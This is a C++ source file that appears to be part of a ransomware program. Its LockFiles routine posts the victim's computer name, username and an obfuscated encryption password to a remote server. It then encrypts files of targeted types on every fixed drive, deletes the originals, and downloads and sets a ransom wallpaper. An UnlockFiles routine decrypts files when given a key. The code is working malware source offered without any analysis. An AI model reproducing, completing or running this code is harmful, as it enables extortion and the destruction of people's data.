#pragma warning (disable : 4996)

#include <windows.h>
#include <stdio.h>
#include <iostream>
#include <vector>
#include <Lmcons.h>

#include "config.h"
#include "GeneralOperation.h"
#include "CryptOperation.h"
#include "FileOperation.h"
#include <iomanip>

using namespace std;

#pragma comment(lib,"ws2_32.lib")

namespace {

	SOCKET connectToServer(char *szServerName, WORD portNum)
	{
		struct hostent *hp;
		unsigned int addr;
		struct sockaddr_in server;
		SOCKET conn;

		conn = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
		if (conn == INVALID_SOCKET)
			return NULL;

		if (inet_addr(szServerName) == INADDR_NONE)
		{
			hp = gethostbyname(szServerName);
		}
		else
		{
			addr = inet_addr(szServerName);
			hp = gethostbyaddr((char*)&addr, sizeof(addr), AF_INET);
		}

		if (hp == NULL)
		{
			closesocket(conn);
			return NULL;
		}

		server.sin_addr.s_addr = *((unsigned long*)hp->h_addr);
		server.sin_family = AF_INET;
		server.sin_port = htons(portNum);
		if (connect(conn, (struct sockaddr*)&server, sizeof(server)))
		{
			closesocket(conn);
			return NULL;
		}
		return conn;
	}

	int getHeaderLength(char *content)
	{
		const char *srchStr1 = "\r\n\r\n", *srchStr2 = "\n\r\n\r";
		char *findPos;
		int ofset = -1;

		findPos = strstr(content, srchStr1);
		if (findPos != NULL)
		{
			ofset = findPos - content;
			ofset += strlen(srchStr1);
		}

		else
		{
			findPos = strstr(content, srchStr2);
			if (findPos != NULL)
			{
				ofset = findPos - content;
				ofset += strlen(srchStr2);
			}
		}
		return ofset;
	}

	void mParseUrl(char const * mUrl, string &serverName, string &filepath, string &filename)
	{
		string::size_type n;
		string url = mUrl;

		if (url.substr(0, 7) == "http://")
			url.erase(0, 7);

		if (url.substr(0, 8) == "https://")
			url.erase(0, 8);

		n = url.find('/');
		if (n != string::npos)
		{
			serverName = url.substr(0, n);
			filepath = url.substr(n);
			n = filepath.rfind('/');
			filename = filepath.substr(n + 1);
		}

		else
		{
			serverName = url;
			filepath = "/";
			filename = "";
		}
	}

	char *readUrl2(char const * szUrl, char const * szFile, int port, char const * szRequestType, long &bytesReturnedOut, char **headerOut)
	{
		const int bufSize = 2048;
		char readBuffer[bufSize], sendBuffer[bufSize], tmpBuffer[bufSize];
		char *tmpResult = NULL, *result;
		SOCKET conn;
		string server, filepath, filename;
		long totalBytesRead, thisReadSize, headerLen;

		mParseUrl(szUrl, server, filepath, filename);

		conn = connectToServer((char*)server.c_str(), port);

		sprintf(tmpBuffer, "%s %s HTTP/1.0", szRequestType, szFile);
		strcpy(sendBuffer, tmpBuffer);
		strcat(sendBuffer, "\r\n");
		sprintf(tmpBuffer, "Host: %s", server.c_str());
		strcat(sendBuffer, tmpBuffer);
		strcat(sendBuffer, "\r\n");
		strcat(sendBuffer, "\r\n");
		send(conn, sendBuffer, strlen(sendBuffer), 0);

		printf("Buffer being sent:\n%s", sendBuffer);

		totalBytesRead = 0;
		while (1)
		{
			memset(readBuffer, 0, bufSize);
			thisReadSize = recv(conn, readBuffer, bufSize, 0);

			if (thisReadSize <= 0)
				break;

			tmpResult = (char*)realloc(tmpResult, thisReadSize + totalBytesRead);

			memcpy(tmpResult + totalBytesRead, readBuffer, thisReadSize);
			totalBytesRead += thisReadSize;
		}

		headerLen = getHeaderLength(tmpResult);
		long contenLen = totalBytesRead - headerLen;
		result = new char[contenLen + 1];
		memcpy(result, tmpResult + headerLen, contenLen);
		result[contenLen] = 0x0;
		char *myTmp;

		myTmp = new char[headerLen + 1];
		strncpy(myTmp, tmpResult, headerLen);
		myTmp[headerLen] = NULL;
		free(tmpResult);
		*headerOut = myTmp;

		bytesReturnedOut = contenLen;
		closesocket(conn);
		return(result);
	}
}


std::string GeneralOperation::GetLastErrorAsString()
{
	DWORD errorMessageID = ::GetLastError();
	if (errorMessageID == 0)
		return std::string(); //No error message has been recorded

	LPSTR messageBuffer = nullptr;
	size_t size = FormatMessageA(FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS,
		NULL, errorMessageID, MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), (LPSTR)&messageBuffer, 0, NULL);

	std::string message(messageBuffer, size);

	//Free the buffer.
	LocalFree(messageBuffer);

	return message;
}

void GeneralOperation::ChangeWallpeper()
{
	std::string executionPath;
	char buffer[MAX_PATH];
	GetModuleFileName(NULL, buffer, MAX_PATH);
	string::size_type pos = string(buffer).find_last_of("\\/");
	if (pos == string::npos)
		executionPath = "c:\\";
	else
		executionPath = string(buffer).substr(0, pos);

	std::string wallpaperPath = executionPath + WALLPAPER_LOCAL_NAME;
	DownloadData(WALLPAPER_HOST, WALLPAPER_PATH, WALLPAPER_PORT, "GET", wallpaperPath);
	auto result = SystemParametersInfo(SPI_SETDESKWALLPAPER, 0, const_cast<char*>(wallpaperPath.c_str()), SPIF_UPDATEINIFILE);
}

void GeneralOperation::GetHardDiskDrivesNames(std::vector<std::string> & strIPAddresses)
{
	DWORD dwBufferSize = GetLogicalDriveStrings(0, NULL);
	char* pDrives = (char *)malloc(dwBufferSize + 1);
	char* pDrivesToDelete = pDrives;
	if (pDrives != NULL)
	{
		GetLogicalDriveStrings(dwBufferSize, pDrives);
		while (*pDrives)
		{
			UINT nDriveType = GetDriveType(pDrives);

			if (DRIVE_FIXED == nDriveType)
			{
				strIPAddresses.push_back(pDrives);
			}
			pDrives += lstrlen(pDrives) + 1;
		}

		free(pDrivesToDelete);

		pDrivesToDelete = NULL;
	}
}

void GeneralOperation::UnlockFiles(std::string const & key)
{
	config::init();
	if (key.length() == 0)
	{
		MessageBoxW(NULL, CHEATER_MESSAGE, L"", MB_OK);
		return;
	}

	auto keyData = CryptOperation::Base64Decode(key);
	auto computerInfo = GeneralOperation::ComputerName() + GeneralOperation::Username();
	keyData = CryptOperation::XOR(keyData.substr(computerInfo.size()));

	std::vector<std::string> hddDriveNames;
	GeneralOperation::GetHardDiskDrivesNames(hddDriveNames);
	CryptOperation cryptOperation;

	for (size_t i = 0; i < hddDriveNames.size(); i++)
	{
		std::string drive = hddDriveNames.at(i);
		std::string fullPath = drive + SEARCH_PATH;
		FileOperation::SetDirectory(fullPath);

		std::vector<std::string> files;
		FileOperation::SearchDirectory(files, FileOperation::GetDirectory(), config::DECRPYTION_EXTENSIONS, true);

		auto end = files.end();
		for (auto it = files.begin(); it != end; ++it)
		{
			std::string newFileName = (*it).substr(0, (*it).length() - 4);
			cryptOperation.UnlockFile(const_cast<char *>((*it).c_str()), const_cast<char *>(newFileName.c_str()), const_cast<char *>(keyData.c_str()));
			remove(const_cast<char *>((*it).c_str()));
		}
	}

	MessageBoxW(NULL, VALIDATION_MESSAGE, L"", MB_OK);
	PostQuitMessage(0);
}

void GeneralOperation::LockFiles()
{
	config::init();

	auto password = CryptOperation::GenerateRandomPassword();

	std::string hashedPassword = CryptOperation::XOR(password);
	std::string computerInfo = GeneralOperation::ComputerName() + GeneralOperation::Username();
	computerInfo = computerInfo.append(hashedPassword);
	hashedPassword = CryptOperation::Base64Encode(computerInfo);

	auto computername = GeneralOperation::ComputerName();
	auto username = GeneralOperation::Username();

	std::string setupUrl("/setup?");
	setupUrl.append("c=");
	setupUrl.append(computername);
	setupUrl.append("&u=");
	setupUrl.append(username);
	setupUrl.append("&p=");
	setupUrl.append(hashedPassword);

	std::string result = FetchDataFromURL(HOST_NAME, setupUrl, HOST_PORT, "POST");

	if (result.compare("1") == 0)
	{
		CryptOperation cryptOperation;

		std::vector<std::string> hddDriveNames;
		GeneralOperation::GetHardDiskDrivesNames(hddDriveNames);

		char myPath[_MAX_PATH + 1];
		GetModuleFileName(NULL, myPath, _MAX_PATH);

		for (size_t i = 0; i < hddDriveNames.size(); i++)
		{
			std::string drive = hddDriveNames.at(i);
			FileOperation::SetDirectory(drive + SEARCH_PATH);

			std::vector<std::string> files;
			FileOperation::SearchDirectory(files, FileOperation::GetDirectory(), config::ENCRYPT_EXTENSIONS, true);

			auto end = files.end();
			for (auto it = files.begin(); it != end; ++it)
			{
				std::string newFileName = (*it) + "." + DEFAULT_ENCRYPT_EXTENSION;
				cryptOperation.LockFile(const_cast<char *>((*it).c_str()), const_cast<char *>(newFileName.c_str()), const_cast<char *>(password.c_str()));
				SetFileAttributes((*it).c_str(), GetFileAttributes((*it).c_str()) & ~FILE_ATTRIBUTE_READONLY);
				remove(const_cast<char *>((*it).c_str()));
			}
		}
	}

	GeneralOperation::ChangeWallpeper();
}

std::string GeneralOperation::Username()
{
	char username[UNLEN + 1];
	DWORD usernameLength = UNLEN + 1;

	GetUserName(username, &usernameLength);
	return std::string(username);
}

std::string GeneralOperation::ComputerName()
{
	char computerName[MAX_COMPUTERNAME_LENGTH + 1];
	DWORD computerNameLength = MAX_COMPUTERNAME_LENGTH + 1;

	GetComputerName(computerName, &computerNameLength); //Get the computer name
	return std::string(computerName);
}

std::string GeneralOperation::FetchDataFromURL(std::string url, std::string & file, int port, std::string requestType)
{
	const int bufLen = 2048;
	long fileSize;
	char *memBuffer, *headerBuffer;

	WSADATA wsaData;
	memBuffer = headerBuffer = NULL;

	if (WSAStartup(0x101, &wsaData) != 0)
		return "";

	memBuffer = readUrl2(url.c_str(), file.c_str(), port, requestType.c_str(), fileSize, &headerBuffer);

	free(headerBuffer);
	WSACleanup();

	string returnValue(memBuffer);
	free(memBuffer);
	return returnValue;
}

void GeneralOperation::DownloadData(std::string url, std::string file, int port, std::string requestType, std::string fileDestination)
{
	const int bufLen = 1024;
	long fileSize;
	char *memBuffer, *headerBuffer;
	FILE *fp;

	WSADATA wsaData;
	memBuffer = headerBuffer = NULL;

	if (WSAStartup(0x101, &wsaData) != 0)
		return;

	memBuffer = readUrl2(url.c_str(), file.c_str(), port, requestType.c_str(), fileSize, &headerBuffer);

	if (fileSize != 0)
	{
		fp = fopen(fileDestination.c_str(), "wb");
		fwrite(memBuffer, 1, fileSize, fp);
		fclose(fp);
		free(headerBuffer);
	}

	free(memBuffer);

	WSACleanup();
}